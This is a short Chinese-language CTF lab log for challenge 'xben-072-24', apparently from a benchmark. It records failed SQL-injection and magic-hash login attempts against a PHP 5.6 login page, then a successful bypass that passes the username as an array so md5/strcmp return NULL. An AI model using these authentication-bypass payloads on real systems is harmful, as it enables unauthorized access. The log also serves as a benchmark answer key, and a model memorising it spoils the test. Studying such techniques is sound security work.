# xben-072-24 · 探索记录

对应题解：[`xben-072-24.md`](./xben-072-24.md)

## 目标与起点

`10.0.172.219:80`，PHP 5.6.40，AUTH 02 登录页（username/password/login）。

## 第一阶段：常规绕过全部失败

| 输入 | 结果 |
| --- | --- |
| `admin` + 常见口令 | `Incorrect` |
| `admin'-- -` | `Incorrect` |
| `' OR 1=1-- -` | `Incorrect` |
| `password=240610708` | `Incorrect` |

## 第二阶段：数组参数

| 输入 | 结果 |
| --- | --- |
| `username[]=x&password=x` | **flag** |

## 这次真正的收获

PHP 的数组参数会改变函数语义（`md5(array)` 返回 NULL、`strcmp(array, str)` 抛警告并返回 NULL），
在 `==`/`!strcmp()` 这类判断里就是绕过点。
